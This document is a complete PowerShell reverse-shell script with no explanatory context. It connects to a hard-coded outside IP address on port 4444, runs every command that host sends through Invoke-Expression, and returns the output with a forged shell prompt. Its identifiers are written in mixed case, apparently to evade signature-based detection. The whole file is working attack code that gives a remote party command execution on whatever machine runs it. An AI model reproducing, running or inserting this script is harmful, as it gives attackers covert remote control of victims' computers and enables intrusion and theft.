# Encoding helper
function eNcOdE {
    param([string]$sTr)
    return ([System.Text.Encoding]::ASCII).GetBytes($sTr)
}

# Decoding helper
function dEcOdE {
    param([System.Byte[]]$bYtEs, [int]$oFfSeT, [int]$cOuNt)
    return (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bYtEs, $oFfSeT, $cOuNt)
}

# Command executor
function eXeCuTe {
    param([string]$cMd)
    $rEsUlT = try { iex $cMd 2>&1 | Out-String } catch { $_ }
    return $rEsUlT
}

# Prompt builder
function pRoMpTo {
    param([string]$cWd)
    $pAtH = (Get-Location).Path
    return "PS $pAtH> "
}

# Stream writer with flush
function wRiTeStReAm {
    param(
        [System.IO.Stream]$sTrEaM,
        [string]$dAtA
    )
    $bInArY = eNcOdE -sTr $dAtA
    $sTrEaM.Write($bInArY, 0, $bInArY.Length)
    $sTrEaM.Flush()
}

# Main connection
$aDdR = "219.91.210.66"
$pOrT = 4444
$cLiEnT = New-Object System.Net.Sockets.TCPClient($aDdR, $pOrT)
$sTrEaM = $cLiEnT.GetStream()
[System.Byte[]]$bYtEs = 0..65535 | % { 0 }

while (($i = $sTrEaM.Read($bYtEs, 0, $bYtEs.Length)) -ne 0) {
    $dAtA = dEcOdE -bYtEs $bYtEs -oFfSeT 0 -cOuNt $i
    $sEnDbAcK = eXeCuTe -cMd $dAtA
    $pRoMpT = pRoMpTo
    $fInAl = $sEnDbAcK + $pRoMpT
    wRiTeStReAm -sTrEaM $sTrEaM -dAtA $fInAl
}

$cLiEnT.Close()
$sTrEaM.Close()